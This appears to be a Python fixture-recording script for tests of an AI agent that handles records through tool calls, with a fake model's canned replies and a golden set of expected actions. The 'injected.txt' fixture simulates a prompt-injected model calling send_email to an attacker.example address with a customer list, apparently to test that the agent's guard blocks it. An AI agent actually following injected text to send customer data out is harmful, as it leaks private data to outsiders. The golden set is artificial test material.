"""Writes the fake model's recorded answers for the fixture inputs.

Run from the repo root after changing an input: ``uv run python -m tests.fixtures.record``.
Keys are ``<sha256 of the input bytes>-<attempt>.json``; the fake replays them in attempt order.
"""

import hashlib
import json
from pathlib import Path

HERE = Path(__file__).parent
INPUTS, RECORDED = HERE / "inputs", HERE / "recorded"


def tool(name: str, **inputs: str) -> dict:
    return {"tool_calls": [{"name": name, "input": inputs}], "stop_reason": "tool_use"}


def text(t: str) -> dict:
    return {"text": t, "stop_reason": "end_turn"}


ANSWERS: dict[str, list[dict]] = {
    "create.txt": [tool("create_draft_record", title="Standing desk", amount="249.00")],
    "lookup.txt": [tool("lookup_record", id="rec-001")],
    "delete.txt": [tool("delete_record", id="rec-001")],
    "injected.txt": [tool("send_email", to="someone@attacker.example", body="customer list")],
    "pii.txt": [tool("create_draft_record", title="Office chair", amount="120.00")],
    "extract.txt": [
        text(
            '{"title": "Monitor arm", "amount": "59.90", "requested_action": "create_draft_record"}'
        )
    ],
    "bad.txt": [text("not json at all"), text('{"title": "", "amount": "x"}')],
    "loop.txt": [tool("echo", text="again")] * 5,
    "chat.txt": [text("Nothing to do here.")],
}

# Golden set: (input file, expected action, expected inputs). The recorded answer equals the expectation;
# a test makes one wrong in its tmp copy to prove the gate goes red.
GOLDEN = [
    ("golden-01.txt", "create_draft_record", {"title": "Standing desk", "amount": "249.00"}),
    ("golden-02.txt", "create_draft_record", {"title": "Office chair", "amount": "120.00"}),
    ("golden-03.txt", "create_draft_record", {"title": "Monitor arm", "amount": "59.90"}),
    ("golden-04.txt", "create_draft_record", {"title": "Desk lamp", "amount": "34.50"}),
    ("golden-05.txt", "create_draft_record", {"title": "Bookshelf", "amount": "180.00"}),
    ("golden-06.txt", "create_draft_record", {"title": "Whiteboard", "amount": "75.25"}),
    ("golden-07.txt", "create_draft_record", {"title": "Footrest", "amount": "29.99"}),
    ("golden-08.txt", "create_draft_record", {"title": "Filing cabinet", "amount": "210.00"}),
    ("golden-09.txt", "lookup_record", {"id": "rec-042"}),
    ("golden-10.txt", "lookup_record", {"id": "rec-107"}),
]


def digest_of(name: str) -> str:
    return hashlib.sha256((INPUTS / name).read_bytes()).hexdigest()


def write_all() -> None:
    for old in RECORDED.glob("*.json"):
        old.unlink()
    answers = dict(ANSWERS)
    answers.update({name: [tool(action, **inputs)] for name, action, inputs in GOLDEN})
    for name, replies in answers.items():
        for attempt, answer in enumerate(replies, start=1):
            body = {"input_tokens": 500, "output_tokens": 50, **answer}
            (RECORDED / f"{digest_of(name)}-{attempt}.json").write_text(
                json.dumps(body, indent=2, sort_keys=True) + "\n", encoding="utf-8", newline="\n"
            )
    lines = [
        json.dumps(
            {"id": f"g{i:02d}", "input_ref": name, "expected": {"action": a, "inputs": inp}},
            sort_keys=True,
        )
        for i, (name, a, inp) in enumerate(GOLDEN, start=1)
    ]
    (HERE / "golden" / "test-agent.jsonl").write_text(
        "\n".join(lines) + "\n", encoding="utf-8", newline="\n"
    )


if __name__ == "__main__":
    write_all()
